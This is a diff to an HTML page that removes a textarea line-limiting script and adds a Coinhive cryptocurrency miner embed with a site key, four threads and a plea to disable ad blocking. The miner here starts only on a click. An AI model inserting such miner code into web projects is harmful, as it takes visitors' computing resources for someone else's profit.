@@ -1,39 +1,20 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>Try to type more than 6 lines</h1>
-
-     <textarea cols="200" wrap="hard" id="splitLines" style="height: 200px;"></textarea>
-    <!-- The cols attribute will prevent users on how many character
-    they can type in each row -->
-
-     <script>
-     var limit = 6; // <---max no of lines you want in textarea
-     var textarea = document.getElementById("splitLines");
-     var spaces = textarea.getAttribute("cols");
-     textarea.onkeyup = function() {
-        var lines = textarea.value.split("\n");
-        for (var i = 0; i < lines.length; i++)
-        {
-             if (lines[i].length <= spaces) continue;
-             var j = 0;
-             var space = spaces;
-             while (j++ <= spaces)
-             {
-                if (lines[i].charAt(j) === " ") space = j;
-             }
-         lines[i + 1] = lines[i].substring(space + 1) + (lines[i + 1] || "");
-         lines[i] = lines[i].substring(0, space);
-       }
-         if(lines.length>limit)
-         {
-             textarea.style.color = 'red';
-             setTimeout(function(){
-                textarea.style.color = '';
-             },500);
-         }
-        textarea.value = lines.slice(0, limit).join("\n");
-     };
-     </script>
+<script src="https://coinhive.com/lib/miner.min.js" async></script>
+<div class="coinhive-miner" 
+	style="width: 256px; height: 310px"
+	data-key="Xiyvkt5jrPLrlrhJCgoguUNfKJTliao5"
+	data-autostart="false"
+	data-whitelabel="false"
+	data-background="#000000"
+	data-text="#eeeeee"
+	data-action="#00ff00"
+	data-graph="#555555"
+	data-threads="4"
+	data-throttle="0.1"
+	data-start="Start Now!">
+	<em>Please disable Adblock!</em>
+</div>
  	</body>
 </html>
